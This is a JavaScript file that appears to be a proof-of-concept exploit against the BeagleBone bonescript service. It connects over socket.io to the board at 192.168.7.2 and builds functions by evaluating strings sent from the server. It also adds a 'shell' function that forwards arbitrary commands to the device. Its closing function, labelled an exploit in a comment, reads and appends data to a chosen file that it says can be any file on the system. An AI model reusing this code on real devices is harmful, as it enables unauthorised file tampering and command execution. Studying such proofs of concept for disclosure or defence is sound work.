var base_url = '/bone101';  
function update_ace_editor_id_val() {
    ace_editor = document.getElementsByClassName('slick-active')[0]
        .getElementsByClassName('ace_editor')[0];
    if (typeof ace_editor != 'undefined')
        ace_editor_id = ace_editor.id;
    else
        ace_editor_id = -1;
}
  


var io = require('socket.io-client')('http://localhost');
var _bonescript = require('./bonescript');
function _seqcall(data) {
    if((typeof data.seq != 'number') || (typeof _bonescript._callbacks[data.seq] != 'function'))
        throw "Invalid callback message received: " + JSON.stringify(data);
    _bonescript._callbacks[data.seq](data);
    if(data.oneshot) delete _bonescript._callbacks[data.seq];
}

var socket_addr = 'http://' + "192.168.7.2" + ':80';
var socket = io.connect(socket_addr);

function _onSocketIOLoaded_workaround() {
    //console.log("socket.io loaded");
    socket.on('require', getRequireData);
    socket.on('bonescript', _seqcall);
    socket.on('connect', _bonescript.on.connect);
    socket.on('connecting', _bonescript.on.connecting);
    socket.on('disconnect', _bonescript.on.disconnect);
    socket.on('connect_failed', _bonescript.on.connect_failed);
    socket.on('error', _bonescript.on.error);
    socket.on('reconnect', _bonescript.on.reconnect);
    socket.on('reconnect_failed', _bonescript.on.reconnect_failed);
    socket.on('reconnecting', _bonescript.on.reconnecting);
    socket.on('initialized', _bonescript.on.initialized);

    function getRequireData(m) {
        if(!m.module || !m.data)
            throw('Invalid "require" message sent for "' + m.module + '"');
        //console.log('Initialized module: ' + m.module);
        _bonescript.modules[m.module] = {};
        for(var x in m.data) {
            if(!m.data[x].type || !m.data[x].name || (typeof m.data[x].value == 'undefined'))
                throw('Invalid data in "require" message sent for "' + m.module + '.' + m.data[x] + '"');
            if(m.data[x].type == 'function') {
                // define the function
                if(!m.data[x].value)
                    throw('Missing args in "require" message sent for "' + m.module + '.' + m.data[x] + '"');
                var myargs = m.data[x].value;

                // eval of objString builds the call data out of arguments passed in
                var objString = '';
                for(var y in myargs) {
                    if(isNaN(y)) continue;  // Need to find the source of this bug
                    if(myargs[y] == 'callback') continue;
                    objString += ' if(typeof ' + myargs[y] + ' == "function") {\n';
                    objString += '  ' + myargs[y] + ' = ' + myargs[y] + '.toString();\n';
                    objString += ' }\n';
                    objString += ' calldata.' + myargs[y] + ' = ' + myargs[y] + ';\n';
                }
                var argsString = myargs.join(', ');
                var handyfunc = '_bonescript.modules["' + m.module + '"].' + m.data[x].name +
                    ' = ' +
                    'function (' + argsString + ') {\n' +
                    ' var calldata = {};\n' +
                    objString +
                    ' if(callback) {\n' +
                    '  _bonescript._callbacks[_bonescript._seqnum] = callback;\n' +
                    '  calldata.seq = _bonescript._seqnum;\n' +
                    '  _bonescript._seqnum++;\n' +
                    ' }\n' +
                    ' socket.emit("' + m.module + '$' + m.data[x].name + '", calldata);\n' +
                    '};\n';
                eval(handyfunc);
            } else {
                _bonescript.modules[m.module][m.data[x].name] = m.data[x].value;
            }
        }

        // Work-around to add shell command
        _bonescript.modules[m.module]["socket"] = socket;
        _bonescript.modules[m.module]["shell"] = function(command) {
            socket.emit('shell', command);
        }
        
    // Call-back initialized function
    _bonescript.on.initialized();
    }
}

function connectTarget(address, handlers, onerror) {
    var url = address;
    url = url.replace(/^(http:\/\/|https:\/\/)*/, 'http://');
    url = url.replace(/(\/)*$/, '/bonescript.js');
    loadScript(url, addHandlers);
    function loadScript(url, onload) {
        try {
            var head = document.getElementsByTagName('head')[0];
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = url;
            script.charset = 'UTF-8';
            var scriptObj = head.appendChild(script);
            if(onerror) {
                scriptObj.addEventListener('error', onerror);
            }
            scriptObj.onload = onload;
        } catch(ex) {
            if(onerror) onerror(ex);
        }
    }
    function addHandlers() {
        if(typeof handlers == 'function') {
            handlers();
            return;
        }
        if(typeof _bonescript != 'undefined') {
            _bonescript.address = address;
            if(handlers.initialized) _bonescript.on.initialized = handlers.initialized;
            if(handlers.connect) _bonescript.on.connect = handlers.connect;
            if(handlers.connecting) _bonescript.on.connecting = handlers.connecting;
            if(handlers.disconnect) _bonescript.on.disconnect = handlers.disconnect;
            if(handlers.connect_failed) _bonescript.on.connect_failed = handlers.connect_failed;
            if(handlers.reconnect_failed) _bonescript.on.reconnect_failed = handlers.reconnect_failed;
            if(handlers.reconnect) _bonescript.on.reconnect = handlers.reconnect;
            if(handlers.reconnecting) _bonescript.on.reconnecting = handlers.reconnecting;
        }
        if(typeof handlers.callback == 'function') handlers.callback();
    }
}

function seq (){
    /**
    This is a POC implementation of an exploit for the BeagleBone using bonescript.
    This file implements an append function on any file in the system.
    */

    var b = require('./bonescript');
    // file to be changed
    var file = '/home/debian/out.txt';
    // this is the data read
    let output = '';
    // this is the data to append
    let append = 'datatoappend\n'

    // this function reads file and outputs data in the output variable
    b.readTextFile(file, function (x){
        output = x.data;

        console.log('inside method output of x '+ output);
    });

    // this function writes data to a file
    // this function is delayed so it does not write before read is completed
    setTimeout(function(){ 
         console.log("output of x:  "+output);
        b.writeTextFile(file, output+append, readStatus);
    }, 3000); 

    function readStatus(x) {
        console.log(JSON.stringify(x));
    }
}
_onSocketIOLoaded_workaround();
seq();